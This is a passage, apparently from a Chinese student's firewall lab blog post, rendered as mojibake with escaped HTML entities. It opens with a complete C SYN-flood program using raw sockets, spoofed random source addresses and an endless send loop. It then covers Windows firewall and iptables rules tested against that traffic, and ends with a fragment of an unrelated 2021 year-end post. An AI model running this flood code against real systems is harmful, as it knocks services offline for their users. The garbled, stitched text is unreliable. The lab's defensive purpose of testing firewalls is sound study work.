‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; // tcp æŠ¥å¤´ struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; //TCPçš„ä¼ªæŠ¥å¤´ï¼Œåœ¨è®¡ç®—TCPçš„æ ¡éªŒå’Œæ—¶éœ€è¦åŒ…å« struct pseudohdr { unsigned int saddr; //æºç›®çš„IP unsigned int daddr; // ç›®çš„IP char zeros; // 8ä½ä¿ç•™å­—ç¬¦ ä¸€èˆ¬ç½®0 char protocol;// åè®® unsigned short length; // é•¿åº¦ }; // è¿™ä¸ªæ˜¯è®¡ç®—æ ¡éªŒå’Œçš„å‡½æ•° unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // é€šè¿‡ä¼ å…¥çš„æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€åˆå§‹åŒ– IP å¤´éƒ¨ç»“æ„ã€‚ void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } // åˆå§‹åŒ– tcp åŒ… void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 ä»£è¡¨ æ˜¯syn åŒ…ï¼Œtcpä¸‰æ¬¡è¿æ¥è¯·æ±‚çš„å¼€å§‹ tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // åˆå§‹åŒ– tcp ä¼ªæŠ¥å¤´ void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // é€šè¿‡ ç›®æ ‡IPåœ°å€ å’Œ ç›®æ ‡ç«¯å£ ç”Ÿæˆä¸€ä¸ª SYNåŒ…ï¼Œä¿å­˜åˆ°å‚æ•° packet ä¸­ï¼Œå¹¶ä¸”è¿”å›åŒ…çš„å¤§å°ã€‚ int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // åˆ›é€ åŸå§‹å¥—æ¥å­— int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* åœ¨è°ƒç”¨ socket() å‡½æ•°åˆ›å»ºå¥—æ¥å­—æ—¶ï¼ŒæŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º SOCK_RAWï¼Œè¡¨ç¤ºåˆ›å»ºçš„å¥—æ¥å­—ä¸ºåŸå§‹å¥—æ¥å­—ã€‚ç„¶åè°ƒç”¨ setsockopt() å‡½\tæ•°è®¾ç½® IP å¤´éƒ¨ç”±æˆ‘ä»¬è‡ªå·±æ„å»º */ return fd; } // ä¼ å…¥åŸå§‹å¥—æ¥å­—ã€ç›®æ ‡IPåœ°å€å’Œç›®æ ‡ç«¯å£ï¼Œç„¶åé€šè¿‡è°ƒç”¨ sendto() å‡½æ•°å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ª SYNåŒ… int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%då·²æ”»å‡»!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // ä¸»å‡½æ•° int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] ç›®çš„åœ°å€ // argc[2] ç›®çš„ç«¯å£ addr = inet_addr(argv[1]); port = atoi(argv[2]); // åˆ¤æ–­ç«¯å£æ˜¯å¦ å­˜åœ¨ if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // å¼€å¯socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for æ— é™å¾ªç¯ï¼Œå‘é€synåŒ… for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } Windowsé˜²ç«å¢™ï¼šå¤©ç½‘é˜²ç«å¢™\nLinuxé˜²ç«å¢™ï¼š iptables\nFTPæœåŠ¡å™¨ï¼šSer-U\næŠ“åŒ…å·¥å…·ï¼šWireshark\nUDPæ”»å‡»ï¼šUDP-Flood\n0x03 å®éªŒå†…å®¹ 3.1 windowsé˜²ç«å¢™ 3.1.1 è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ® åœ¨é˜²ç«å¢™ä¸­æ·»åŠ å¦‚ä¸‹è§„åˆ™ï¼š è¿™æ ·æ¥æ”¶åˆ°çš„æ‰€æœ‰TCPåŒ…éƒ½ä¼šè¢«æ‹¦æˆªï¼Œå¹¶ä¸”è¢«è®°å½•ã€‚ æ²¡æœ‰å¼€å¯é˜²ç«å¢™å‰ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œå‘é€éšæœºç«¯å£çš„tcpç¨‹åº é€šè¿‡WiresharkæŠ“åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„TCPåŒ…å¹¶æ²¡æœ‰è¢«æ‹¦æˆªã€‚ å¼€å¯é˜²ç«å¢™ï¼Œå†åº¦å¯åŠ¨ç¨‹åºã€‚ å¯ä»¥çœ‹åˆ°é˜²ç«å¢™è¿›è¡Œæé†’ï¼Œå¹¶ä¸”æ—¥å¿—é‡Œé¢æ˜¾ç¤ºäº†æ”»å‡»æœºå‘é¶æœº192.168.195.131çš„ç«¯å£tcpè¿æ¥ã€‚ å› æ­¤åŠ ä¸Šè¯¥ç«¯å£åï¼Œæ‰€æœ‰tcpåŒ…éƒ½è¢«æˆªæ–­äº†ã€‚ 3.1.2 è¿‡æ»¤R-\u0026gt;Lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ® å‘é€åˆ°ç«¯å£ä¸º21å’Œ80çš„ä¼ è¾“å±‚åè®®å¯èƒ½ä¸ºtcpä¹Ÿå¯èƒ½ä¸ºudp\nå› æ­¤ç¼–å†™è¿›å‡ºè§„åˆ™çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å¯¹TCPå’ŒUDPéƒ½è¿›è¡Œé™åˆ¶ã€‚\nUDP TCP å› ä¸ºæˆ‘çš„å®¢æˆ·ç«¯å·²ç»å¼€å¯äº†21å’Œ80ç«¯å£ï¼Œæ‰€æœ‰æˆ‘ä»¬è¿™é‡Œç›´æ¥é€‰æ‹©å·²æˆæƒå¼€æ”¾çš„ç«¯å£å³å¯ã€‚ TCP\né˜²ç«å¢™å¼€å¯å‰ï¼š\nå¯ä»¥çœ‹åˆ°TCPåŒ…å¯ä»¥å‘åˆ°æœºå™¨ã€‚ å¼€å¯é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°åœ¨æ—¥å¿—é‡Œé¢ç¨‹åºè¿æ¥80ç«¯å£è¢«æ‹’ç»ã€‚ æ”»å‡»21ç«¯å£\nå¯ä»¥çœ‹åˆ°è¿™é‡Œè¿æ¥21ç«¯å£åŒæ ·è¢«æ‹’ç»ã€‚\nUDP\nå…³é—­é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°æŠ“åˆ°udpåŒ…\nå¼€å¯é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°80ç«¯å£çš„udpåŒ…å·²è¢«æ‹¦æˆª æ”»å‡»21ç«¯å£\nå¯ä»¥çœ‹åˆ°21ç«¯å£çš„udpåŒ…å·²è¢«æ‹¦æˆª\n3.1.3 èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ åœ¨windows xp192.168.195.162ä¸­æ­å»ºftpæœåŠ¡å™¨ åˆ›å»ºä¸€ä¸ªftpç”¨æˆ·ï¼Œè´¦æˆ·ä¸ºadminï¼Œå¯†ç ä¸ºadminï¼› æˆ‘ä»¬åœ¨æœ¬æœºè®¿é—®æœåŠ¡å™¨ç«¯ æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°æœåŠ¡å™¨ç«¯ã€‚ è®¾ç½®è§„åˆ™ å½“æˆ‘ä»¬å‘æœåŠ¡å™¨ç«¯å‘é€ftpè¯·æ±‚çš„æ—¶å€™ï¼Œä¼šé€šè¡Œã€‚ 3.1.4 é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ® è¿™é‡Œæˆ‘ä»¬æ˜¯åŸå…ˆçš„å®¢æˆ·ç«¯ä½œä¸ºæ–°çš„æœåŠ¡å™¨ï¼Œå¦ä¸€å°æœºå­æ¥è®¿é—®è¿™ä¸ªæ–°çš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡åŒºçš„é˜²ç«å¢™ä¸Šé…ç½®è§„åˆ™ï¼Œä»è€Œé˜»æ­¢å®¢æˆ·ç«¯ä¸‹è½½æœåŠ¡å™¨ç«¯å†…å®¹ åœ¨æ–°çš„æœåŠ¡å™¨ç«¯é…ç½®FTP å®¢æˆ·ç«¯æŸ¥çœ‹æ•ˆæœ åœ¨æœåŠ¡å™¨ç«¯é…ç½®é˜²æŠ¤å¢™è§„åˆ™ å½“æ”¶åˆ°ç«¯å£ä¸º21çš„tcpè¯·æ±‚çš„æ—¶å€™æ‹’ç»è¯¥è®¿é—®ï¼Œè¿™æ ·å°±ä¿è¯äº†å®¢æˆ·ç«¯ä¸èƒ½ä»æœåŠ¡å™¨ä¸‹è½½ã€‚ å¼€å¯é˜²ç«å¢™ ç»“æœ æˆ‘ä»¬å¯ä»¥åœ¨æ—¥å¿—é‡Œé¢çœ‹åˆ° IP192.168.195.182å¯¹å®¢æˆ·ç«¯çš„è¿æ¥è¢«æ‹’ç» åŒæ—¶ï¼Œè¯¥ç½‘é¡µä¹Ÿæ— æ³•æ‰“å¼€ï¼Œè‡ªç„¶æŸ¥çœ‹åˆ—è¡¨ä»€ä¹ˆçš„ï¼Œä¸Šä¼ ã€ä¸‹è½½éƒ½æ— æ³•è¿›è¡Œï¼Œ 3.2 Linuxé˜²ç«å¢™ iptables 3.2.1 Iptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢ é¦–å…ˆé€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…å¥½iptables\n1 2 3 4 systemctl stop firewalld.service systemctl mask firewalld.service yum install iptables-services systemctl enable iptables.service ç„¶åé€šè¿‡å‘½ä»¤service iptables statusæŸ¥çœ‹æ­¤æ—¶çš„iptablesçŠ¶æ€\næ­¤æ—¶é˜²ç«å¢™ä¸ºæ‰“å¼€çŠ¶æ€ å…³é—­é˜²ç«å¢™service iptables stop\nå†åº¦æŸ¥çœ‹æ­¤æ—¶é˜²ç«å¢™çŠ¶æ€ å‘ç°æ­¤æ—¶é˜²ç«å¢™å·²å…³é—­ã€‚ æ‰“å¼€é˜²ç«å¢™service iptables start\nå†æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ é˜²ç«å¢™å·²æ‰“å¼€ 3.2.2 Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤ æŸ¥çœ‹\nå‘½ä»¤ iptables -L -n åˆ—å‡ºï¼ˆfilterè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ å‘½ä»¤ iptables -nL â€“line-number åˆ—å‡ºï¼ˆfilterè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ï¼Œå¸¦ç¼–å· å‘½ä»¤ iptables -L -n -t nat åˆ—å‡ºï¼ˆnatè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ æ·»åŠ \næ·»åŠ è§„åˆ™æœ‰ä¸¤ä¸ªå‚æ•°ï¼š-Aå’Œ-Iã€‚å…¶ä¸­-Aæ˜¯æ·»åŠ åˆ°è§„åˆ™çš„æœ«å°¾ï¼›-Iå¯ä»¥æ’å…¥åˆ°æŒ‡å®šä½ç½®ï¼Œæ²¡æœ‰æŒ‡å®šä½ç½®çš„è¯é»˜è®¤æ’å…¥åˆ°è§„åˆ™çš„é¦–éƒ¨ã€‚ å½“å‰è§„åˆ™ï¼š æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°å°¾éƒ¨ï¼šiptables â€“A INPUT -j ACCEPT æ„æ€ä¸ºï¼šå‘filterè¡¨ï¼ˆé»˜è®¤è¡¨ï¼‰çš„INPUTé“¾ä¸­è¿½åŠ ä¸€æ¡è§„åˆ™ï¼Œå…¶åŠŸèƒ½æ˜¯æ¥å—æºåœ°å€ä¸ºä»»æ„ã€ç›®æ ‡åœ°å€ä¸ºé˜²ç«å¢™æœ¬èº«çš„æ‰€æœ‰æ•°æ®åŒ…ã€‚ ç¬¬å…­æ¡å³ä¸ºæˆ‘ä»¬æ–°åŠ å…¥çš„è§„åˆ™ æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°ç¬¬ä¸‰æ¡ï¼š iptables -I INPUT 3 -s 192.168.195.131 -j DROP å¯ä»¥çœ‹åˆ°æ–°è§„åˆ™æ·»åŠ åˆ°ç¬¬ä¸‰æ¡äº† åˆ é™¤\nåˆ é™¤ç”¨-Då‚æ•°\nåˆ é™¤ä¹‹å‰æ·»åŠ çš„è§„åˆ™ iptables -A INPUT -j ACCEPTï¼š\nå‘½ä»¤ï¼š iptables -D INPUT -j ACCEPT\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰æ·»åŠ çš„ç¬¬ä¸ƒæ¡è§„åˆ™å·²ç»è¢«åˆ é™¤ã€‚ æœ‰æ—¶å€™è¦åˆ é™¤çš„è§„åˆ™å¤ªé•¿ï¼Œåˆ é™¤æ—¶è¦å†™ä¸€å¤§ä¸²ï¼Œæ—¢æµªè´¹æ—¶é—´åˆå®¹æ˜“å†™é”™ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨â€“line-numberæ‰¾å‡ºè¯¥æ¡è§„åˆ™çš„è¡Œå·ï¼Œå†é€šè¿‡è¡Œå·åˆ é™¤è§„åˆ™ã€‚è¿™é‡Œæˆ‘ä»¬åˆ é™¤ç¬¬ä¸‰è¡Œæˆ‘ä»¬æ’å…¥çš„è§„åˆ™ã€‚\nå‘½ä»¤ï¼šiptables -D INPUT 3\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ’å…¥çš„ç¬¬ä¸‰æ¡è§„åˆ™å·²ç»è¢«åˆ é™¤ã€‚\n3.2.3 è®¾ç½®Iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ 3.2.3.1 ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡ï¼ˆé€šè¿‡PingéªŒè¯ï¼‰ æˆ‘ä»¬é¦–å…ˆå°†æ‰€æœ‰è§„åˆ™éƒ½åˆ é™¤iptables -F å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰çš„è§„åˆ™å…¨éƒ¨è¢«æ¸…é™¤æ‰ã€‚ æ­¤æ—¶æˆ‘ä»¬é€šè¿‡æœºå™¨192.168.195.131æ¥pingæˆ‘ä»¬æ­¤æ—¶çš„Linuxä¸»æœº192.168.195.174 æ­£å¸¸å¯ä»¥pingé€š ç¦æ­¢æ‰€æœ‰è¿›å…¥æœ¬åœ°æœºå™¨çš„æ•°æ®åŒ…é€šè¿‡ å‘½ä»¤å¦‚ä¸‹ï¼šiptables -I INPUT -j DROP å°†è§„åˆ™åŠ å…¥åˆ°INPUTé“¾ä¸­ æ‰€æœ‰å‘ç»™æœ¬æœºçš„åŒ…éƒ½ä¼šè¢«ä¸¢å¼ƒæ‰ æ­¤æ—¶å†åº¦pingæˆ‘ä»¬çš„æœ¬æœº192.168.195.174 å¾ˆæ˜æ˜¾çš„ä¸»æœºå·²ç»æ¥æ”¶ä¸åˆ°pingçš„åŒ…äº† 3.2.3.2 å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº å°†æ‰€æœ‰è§„åˆ™æ¸…é›¶iptables -F\nå…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº\næˆ‘ä»¬è¿™é‡Œè®¾å®šè¿è¡Œ192.168.195.131å¯ä»¥pingé€šï¼Œå…¶ä½™çš„ä¸»æœºå‡æ— æ³•pingé€šæœºå™¨\nå‘½ä»¤ï¼š\n1 2 iptables -I INPUT -j DROP iptables -I INPUT -s 192.168.195.131 -j ACCEPT å› ä¸ºiptablesä¸­è§„åˆ™çš„æ‰§è¡Œä¸ºä»ä¸Šåˆ°ä¸‹ï¼Œæ‰€ä»¥æŒ‰ç…§ä¸Šè¿°ç»™å®šçš„ç¨‹åºæ’å…¥è§„åˆ™ã€‚\nç»“æœä¸ºï¼š\nè¿™æ ·å°±ä¿è¯æ¥æ”¶åˆ°192.168.195.131çš„åŒ…ï¼Œå…¶ä½™çš„åŒ…å‡ä¸¢å¼ƒã€‚\nè¿™é‡Œç›´æ¥æ”¾å‡ºä¸¤ä¸ªæœºå™¨é˜²ç«å¢™å¼€å¯å‰åpingçš„çŠ¶æ€ã€‚\nå…¶ä»–æœºå™¨ 192.168.195.131 3.2.3.3 å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº å°†æ‰€æœ‰è§„åˆ™æ¸…é›¶iptables -F\nå…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº,ï¼Œå¼€å¯ç«¯å£23 å³å¯\nå‘½ä»¤ï¼š\n1 2 iptables -I INPUT -p tcp --dport 23 -j DROP iptables -I INPUT -s 192.168.195.131 -p tcp --dport 23 -j ACCEPT ç›®çš„ç«¯å£ä¸º23çš„è¢«ä¸¢å¼ƒï¼Œå› ä¸ºç¬¬äºŒæ¡è§„åˆ™é¡ºåºåœ¨ç¬¬ä¸€æ¡å‰é¢ï¼Œæ‰€æœ‰å…ˆåˆ¤æ–­æ˜¯å¦ä¸ºç‰¹å®šIPï¼Œæ˜¯çš„åˆ™æ¥å—ï¼Œå¦åˆ™ä¸¢å¼ƒã€‚ å¼€å¯é˜²ç«å¢™å‰ï¼š\n192.168.195.131\nå…¶ä»–æœºå™¨ï¼š\ntelentå‡å¯ä»¥æ­£å¸¸è¿æ¥\nå¼€å¯iptables\nå¯¹äº192.168.195.131çš„æœºå™¨\nå‘ç°ä»ç„¶å¯ä»¥æ­£å¥½è¿æ¥telnet å¯¹äºå…¶ä»–æœºå™¨\nå¯ä»¥çœ‹åˆ°è¿æ¥ä¸åˆ°telnet 0x04 é€‰åšé¢˜ 4.1 ç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ å…è®¸æœ¬æœºç™»å½•å…¶ä»–æœåŠ¡å™¨çš„ftp:192.168.195.162\nå› æ­¤è¿™é‡Œçš„é˜²ç«å¢™ä¸ºoutputå‘å¤–é¢æœåŠ¡å™¨ä»¥21ç«¯å£å‘é€è¯·æ±‚ã€‚\nå‘½ä»¤ï¼šiptables -A OUTPUT -p tcp --sport 21 -j ACCEPT\næ‰€æœ‰æºç«¯å£ä¸º21 å‘å¾€å¤–ç½‘çš„åŒ…éƒ½è¢«å…è®¸é€šè¿‡ã€‚ æ‰§è¡Œé˜²ç«å¢™ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å‘å¾€å¤–ç½‘21ç«¯å£çš„åŒ…å¯ä»¥è¢«ACCEPT ç„¶åé€šè¿‡ftp 192.168.195.131 è¾“å…¥è´¦æˆ·adminå’Œå¯†ç admin æˆ‘ä»¬æˆåŠŸè¿æ¥åˆ°äº†ftpæœåŠ¡å™¨ã€‚ 4.2 æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ã€ä¸‹è½½æ•°æ® è¿™é‡Œæˆ‘ä»¬çš„Centos 7æœ¬èº«ä½œä¸ºä¸€ä¸ªFTPæœåŠ¡å™¨æ¥ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚\nåœ¨æœ¬åœ°é…ç½®å¥½ftpç¯å¢ƒ\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç¯å¢ƒå·²ç»é…ç½®å®Œæ¯• åŒæ—¶åœ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è®¿é—®LinuxæœåŠ¡å™¨ ä¸ºäº†ç¦æ­¢å…¶ä»–ç”¨æˆ·ä¸‹è½½æˆ‘ä»¬linuxæœåŠ¡å™¨ç«¯çš„æ‰€æœ‰æ•°æ®ï¼Œä¹Ÿé˜²æ­¢ä¸Šä¼ ,å³ç¦æ­¢ç”¨æˆ·è®¿é—®æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ã€‚\næ‰€ä»¥æœ‰å‘½ä»¤ï¼šiptables -I INPUT -p tcp --dport 21 -j DROP æ‰€æœ‰ç›®çš„ç«¯å£ä¸º21çš„æ•°æ®åŒ…éƒ½å°†è¢«ä¸¢å¼ƒ æ­¤æ—¶æˆ‘ä»¬çš„å®¢æˆ·ç«¯å†åº¦è®¿é—®æˆ‘ä»¬çš„Linux FTP æœåŠ¡å™¨ç«¯\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ­¤æ—¶å·²ç»æ— æ³•è®¿é—®è¯¥æ–‡ä»¶å¤¹äº†ã€‚æ— æ³•è®¿é—®åˆ°æˆ‘ä»¬çš„LinuxæœåŠ¡å™¨ 0x05 å®éªŒç»“è®º é€šè¿‡å¯¹Windowsä¸‹å’ŒLinuxä¸‹é˜²ç«å¢™çš„é…ç½®æƒ…å†µï¼Œè‡ªå·±äº²è‡ªç¼–å†™é˜²ç«å¢™çš„ç›¸å…³è§„åˆ™ï¼Œå¯¹åŒ…è¿‡æ»¤é˜²ç«å¢™æœ‰äº†è¿›ä¸€æ­¥çš„äº†è§£å’Œè®¤çŸ¥ã€‚åŒæ—¶é’ˆå¯¹ä¸åŒç¯å¢ƒä¸‹é˜²ç«å¢™é…ç½®ï¼ŒLinuxä¸‹çš„é˜²ç«å¢™é…ç½®åº”è¯¥æ¯”Windwosæ›´ä¸ºè‡ªç”±ï¼Œè‡ªå®šä¹‰çš„æ¯”è¾ƒå¤šã€‚ ","permalink":"http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/","summary":"é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„T","title":"é˜²ç«å¢™å®éªŒ"},{"content":"2021 å°ç»“ å½“ä¸€ä¸ªäººååœ¨ç©ºæ— ä¸€äººçš„å®¿èˆé‡Œï¼Œä¹Ÿè®¸æ˜¯æ— èŠå§ï¼Œä¹Ÿè®¸æ˜¯çœ¼æ…•æœ‹å‹åœˆæ»¡å¤©é£çš„è·¨å¹´å°ç»“ï¼Œä¹Ÿè®¸æ˜¯çœ‹å„ç§æ¨é€çš„å¹´åº¦æ€»ç»“æœ‰æ„Ÿï¼Œå› æ­¤æ€»æƒ³å†™ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿™ç§å­¤å•çš„æ°”æ°›ä¸­ï¼Œè¿™ç§æ„Ÿè§‰å¾ˆéš¾å½¢å®¹ï¼Œæ€»æƒ³æç¬”å€¾è¯‰ä¸€ç‚¹ä¸œè¥¿ï¼Œä¸åä¸å¿«ã€‚ 2021å¹´æ€»çš„æ¥è¯´ï¼ŒæˆåŠŸé—æ†¾å‚åŠã€‚å¦‚æœ2021å¹´åº¦æ€»åˆ†ååˆ†çš„è¯ï¼Œæˆ‘åªèƒ½æ‰“åˆ°7åˆ†ã€‚ è¿™å¤§æ¦‚æ˜¯æœ¬äººç¬¬ä¸€æ¬¡ä¸ªäººå¹´åº¦å°ç»“ï¼Œå½“ç„¶ä¹Ÿæ²¡äººçœ‹ï¼Œä¹Ÿå°±éšä¾¿å†™å†™è‡ªå·±ç›¸å¯¹è‡ªå·±æƒ³è¯´çš„è¯ã€‚ 2021å¹´åº¦çš„æ”¶è· å½“ç„¶è¯´èµ·æ”¶è·ï¼Œè‡ªç„¶æ˜¯è¿™ä¸ªå†™ä½œçš„å¹³å°åšå®¢äº†ã€‚ æ¢åº—åŒ—äº¬ç¾é£Ÿã€‚ 